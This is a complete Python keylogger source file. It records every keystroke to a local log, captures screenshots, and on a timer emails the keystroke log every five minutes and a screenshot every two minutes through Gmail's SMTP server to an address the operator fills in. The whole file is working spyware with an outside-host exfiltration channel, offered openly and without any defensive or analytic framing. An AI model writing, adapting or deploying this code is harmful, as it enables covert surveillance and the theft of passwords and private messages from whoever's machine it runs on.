import smtplib
import ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import time
import cv2
import schedule
from pynput import keyboard
import numpy as np
import pyautogui

flag = True
end_program = False
logFile = "log.txt"
screenshotFile = "ss.png"
logFile_interval = 300
screenshotFile_interval = 120

port = 465  # For SSL
subject = "Keylogger Recorded Data"
body = ""
sender_email = ""  # Enter your mail
receiver_email = ""  # Enter your mail
password = ""  # Enter your password
message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = subject
message.attach(MIMEText(body, "plain"))


def on_press(key):
    if flag:
        with open(logFile, "a") as file:
            try:
                file.write(key.char)
            except AttributeError:
                file.write(str(key))
    else:
        pass


def on_release(key):
    global end_program
    if key == keyboard.Key.esc:
        end_program = True
        return False


def send_logFile():
    global flag
    flag = False

    with open(logFile, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)
    part.add_header("Content-Disposition", f"attachment; filename= {logFile}", )
    message.attach(part)
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.as_string())

    file = open(logFile, "w")
    file.close()
    flag = True


def send_screenshot():
    ss = pyautogui.screenshot()
    ss = cv2.cvtColor(np.array(ss), cv2.COLOR_RGB2BGR)
    cv2.imwrite(screenshotFile, ss)

    with open(screenshotFile, "rb") as attachment:
        part = MIMEBase("image", "png", filename=screenshotFile)
        part.add_header("Content-Disposition", "attachment", filename=screenshotFile)
        part.add_header("X-Attachment-Id", "0")
        part.add_header("Content-ID", "<0>")
        part.set_payload(attachment.read())
    encoders.encode_base64(part)
    message.attach(part)
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.as_string())


def schedule_mail():
    schedule.every(logFile_interval).seconds.do(send_logFile)
    schedule.every(screenshotFile_interval).seconds.do(send_screenshot)

    while not end_program:
        schedule.run_pending()
        time.sleep(1)


listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()
schedule_mail()
